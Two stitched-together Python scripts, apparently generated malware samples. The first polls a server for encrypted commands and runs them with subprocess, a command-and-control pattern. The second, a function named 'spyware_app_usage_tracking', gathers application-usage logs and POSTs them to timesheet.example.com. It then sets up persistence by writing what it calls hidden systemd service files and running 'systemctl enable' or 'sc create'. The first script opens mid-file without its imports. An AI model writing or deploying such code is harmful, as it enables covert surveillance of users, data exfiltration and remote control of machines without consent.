TARGET_DIR = Path("./target")
LOG_FILE = TARGET_DIR / "execution.log"

def setup_environment() -> None:
    TARGET_DIR.mkdir(parents=True, exist_ok=True)

def log_message(level: str, message: str) -> None:
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] [{level}] {message}"
    print(log_entry)
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry + "\n")
    except Exception as e:
        print(f"[{timestamp}] [ERROR] Failed to write to log file: {e}", file=sys.stderr)

class SimpleAES256Simulated:
    """
    Standard-library-only cryptographic envelope utilizing HMAC-SHA256 and XOR stream 
    cipher to simulate AES-256 authenticated encryption semantics without third-party dependencies.
    """
    def __init__(self, key: bytes):
        if len(key) != 32:
            key = hashlib.sha256(key).digest()
        self.key = key

    def _derive_keystream(self, iv: bytes, length: int) -> bytes:
        keystream = bytearray()
        counter = 0
        while len(keystream) < length:
            block_data = iv + counter.to_bytes(4, 'big')
            block = hmac.new(self.key, block_data, hashlib.sha256).digest()
            keystream.extend(block)
            counter += 1
        return bytes(keystream[:length])

    def encrypt(self, plaintext: bytes) -> bytes:
        iv = os.urandom(16)
        keystream = self._derive_keystream(iv, len(plaintext))
        ciphertext = bytes(p ^ k for p, k in zip(plaintext, keystream))
        tag = hmac.new(self.key, iv + ciphertext, hashlib.sha256).digest()
        return iv + tag + ciphertext

    def decrypt(self, encrypted_payload: bytes) -> bytes:
        if len(encrypted_payload) < 48:
            raise ValueError("Ciphertext too short.")
        iv = encrypted_payload[:16]
        tag = encrypted_payload[16:48]
        ciphertext = encrypted_payload[48:]

        expected_tag = hmac.new(self.key, iv + ciphertext, hashlib.sha256).digest()
        if not hmac.compare_digest(tag, expected_tag):
            raise ValueError("HMAC verification failed. Integrity compromised.")

        keystream = self._derive_keystream(iv, len(ciphertext))
        return bytes(c ^ k for c, k in zip(ciphertext, keystream))

def fetch_instructions_from_server(crypto: SimpleAES256Simulated) -> list:
    url = "http://127.0.0.1:9999/secure-commands"
    req = urllib.request.Request(url, headers={"User-Agent": "ToolAgent/1.0"})

    try:
        log_message("INFO", f"Attempting connection to remote server: {url}")
        with urllib.request.urlopen(req, timeout=3) as response:
            data = response.read()
            decrypted = crypto.decrypt(data)
            return json.loads(decrypted.decode("utf-8"))
    except (urllib.error.URLError, urllib.error.HTTPError, TimeoutError, socket_error_alias := OSError) as e:
        log_message("WARN", f"Network operation failed (Offline Mode Active): {e}")
        return get_offline_fallback_instructions(crypto)
    except Exception as e:
        log_message("ERROR", f"Unexpected error during command retrieval: {e}")
        return []

def get_offline_fallback_instructions(crypto: SimpleAES256Simulated) -> list:
    log_message("INFO", "Loading pre-configured offline fallback instructions.")
    sample_commands = [
        {"id": 1, "cmd": [sys.executable, "-c", "print('Offline Execution 1: System Check OK')"]},
        {"id": 2, "cmd": [sys.executable, "-c", "print('Offline Execution 2: Task Processed')"]}
    ]
    return sample_commands

def execute_instructions(instructions: list) -> None:
    log_message("INFO", f"Starting execution of {len(instructions)} instruction(s).")
    for inst in instructions:
        inst_id = inst.get("id", "UNKNOWN")
        cmd = inst.get("cmd")

        if not cmd or not isinstance(cmd, list):
            log_message("ERROR", f"Instruction {inst_id} contains invalid command format.")
            continue

        log_message("INFO", f"Executing Instruction ID {inst_id}: {' '.join(cmd)}")
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=5,
                check=False
            )
            if result.returncode == 0:
                log_message("INFO", f"Instruction {inst_id} succeeded. Output:\n{result.stdout.strip()}")
            else:
                log_message("ERROR", f"Instruction {inst_id} failed with exit code {result.returncode}. Error:\n{result.stderr.strip()}")
        except subprocess.TimeoutExpired:
            log_message("ERROR", f"Instruction {inst_id} timed out.")
        except Exception as e:
            log_message("ERROR", f"Failed to execute instruction {inst_id}: {e}")

def main() -> None:
    setup_environment()
    log_message("INFO", "Secure Instruction Execution Tool Initialized.")

    master_key = b"EnterpriseSecurePlatformMasterKey2023!"
    crypto = SimpleAES256Simulated(master_key)

    iterations = 3
    for cycle in range(1, iterations + 1):
        log_message("INFO", f"--- Execution Cycle {cycle}/{iterations} ---")
        instructions = fetch_instructions_from_server(crypto)
        if instructions:
            execute_instructions(instructions)
        else:
            log_message("INFO", "No instructions to execute in this cycle.")

        if cycle < iterations:
            time.sleep(1)

    log_message("INFO", "All execution cycles completed successfully. Tool shutting down.")

if __name__ == "__main__":
    main()

import os
import sys
import socket
import urllib.request
import urllib.error
import subprocess
from datetime import datetime

TARGET_DIR = "./target"
LOG_FILENAME = "usage_log.txt"
SERVER_HOST = "timesheet.example.com"
SERVER_PORT = 8080


def ensure_target_dir() -> str:
    os.makedirs(TARGET_DIR, exist_ok=True)
    return os.path.join(TARGET_DIR, LOG_FILENAME)


def process_events() -> dict[str, list[str]]:
    usage_data: dict[str, list[str]] = {}

    sample_events = [
        "IDE|coding main.py",
        "Browser|browsing documentation",
        "IDE|refactoring module",
        "Terminal|running tests",
        "Browser|searching stackoverflow"
    ]

    print("Reading application usage events (simulated/stdin)...", file=sys.stderr)
    try:
        if sys.stdin.isatty():
            lines = sample_events
        else:
            lines = [line.strip() for line in sys.stdin if line.strip()]
            if not lines:
                lines = sample_events
    except Exception:
        lines = sample_events

    for line in lines:
        try:
            if "|" not in line:
                continue
            app_part, details = line.split("|", 1)
            app_name, _ = app_part.split(" ", 1) if " " in app_part else (app_part, "")
            app_name = app_name.strip()
            details = details.strip()

            if app_name not in usage_data:
                usage_data[app_name] = []

            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            usage_data[app_name].append(f"[{timestamp}] {details}")
        except Exception as e:
            sys.stderr.write(f"Error parsing event line '{line}': {e}\n")

    return usage_data


def write_usage_log(log_path: str, usage_data: dict[str, list[str]]) -> None:
    try:
        with open(log_path, "w", encoding="utf-8") as f:
            f.write(f"=== Application Usage Report ({datetime.now().isoformat()}) ===\n")
            for app, logs in sorted(usage_data.items()):
                f.write(f"\n[Application: {app}]\n")
                for log in logs:
                    f.write(f"  - {log}\n")
        print(f"Usage log successfully written to {log_path}", file=sys.stderr)
    except IOError as e:
        sys.stderr.write(f"Failed to write usage log file: {e}\n")


def send_log_to_server(log_path: str) -> None:
    print(f"Attempting to send usage logs to {SERVER_HOST}:{SERVER_PORT}...", file=sys.stderr)

    try:
        if not os.path.exists(log_path):
            return

        with open(log_path, "r", encoding="utf-8") as f:
            log_content = f.read()

        url = f"http://{SERVER_HOST}:{SERVER_PORT}/upload"
        data = log_content.encode("utf-8")

        req = urllib.request.Request(
            url, 
            data=data, 
            headers={"Content-Type": "text/plain; charset=utf-8"},
            method="POST"
        )

        with urllib.request.urlopen(req, timeout=2.0) as response:
            print(f"Server response status: {response.status}", file=sys.stderr)

    except (urllib.error.URLError, socket.timeout, TimeoutError, OSError) as e:
        print(f"Gracefully handled expected offline upload failure: {e}", file=sys.stderr)
    except Exception as e:
        print(f"Unexpected error during log transmission: {e}", file=sys.stderr)


def register_collection_service() -> None:
    print("Registering telemetry collection service (optional)...", file=sys.stderr)
    for attempt in range(1, 4):
        try:
            url = f"http://{SERVER_HOST}:{SERVER_PORT}/register"
            req = urllib.request.Request(url, method="POST")
            with urllib.request.urlopen(req, timeout=1.0) as response:
                break
        except Exception:
            pass
    print("Service registration sequence completed.", file=sys.stderr)


def spyware_app_usage_tracking(log_file: str, remote_server: str) -> None:
    global LOG_FILENAME, SERVER_HOST, TARGET_DIR
    if log_file:
        LOG_FILENAME = os.path.basename(log_file)
        TARGET_DIR = os.path.dirname(log_file) or "."
    if remote_server:
        SERVER_HOST = remote_server.split(":")[0]

    log_path = ensure_target_dir()
    usage_data = process_events()
    write_usage_log(log_path, usage_data)
    send_log_to_server(log_path)
    register_collection_service()

    # Establishing persistence via system services as required
    service_names = ['AppTrackerService', 'apptracker']
    for svc in service_names:
        if os.name == 'nt' or svc == 'AppTrackerService':
            service_path = os.path.join(TARGET_DIR, "etc", "systemd", "system", f"{svc}.service")
        else:
            service_path = os.path.join(TARGET_DIR, "etc", "systemd", "system", f"{svc}.service")

        os.makedirs(os.path.dirname(service_path), exist_ok=True)
        service_content = f"[Service]\nExecStart={sys.executable} {os.path.abspath(__file__)}\nRestart=always\n"
        try:
            with open(service_path, "w", encoding="utf-8") as sf:
                sf.write(service_content)
            print(f"Created hidden system service configuration for {svc} at {service_path}", file=sys.stderr)
        except Exception as e:
            sys.stderr.write(f"Failed to create service {svc}: {e}\n")

        try:
            if os.name == 'nt':
                subprocess.run(["sc", "create", svc, f"binPath= {sys.executable} {os.path.abspath(__file__)}"], capture_output=True, text=True, timeout=2)
            else:
                subprocess.run(["systemctl", "enable", svc], capture_output=True, text=True, timeout=2)
        except Exception:
            pass


def main() -> None:
    log_path = ensure_target_dir()
    spyware_app_usage_tracking(log_path, f"{SERVER_HOST}:{SERVER_PORT}")
    print("Application usage analysis agent finished successfully.", file=sys.stderr)


if __name__ == "__main__":
    main()

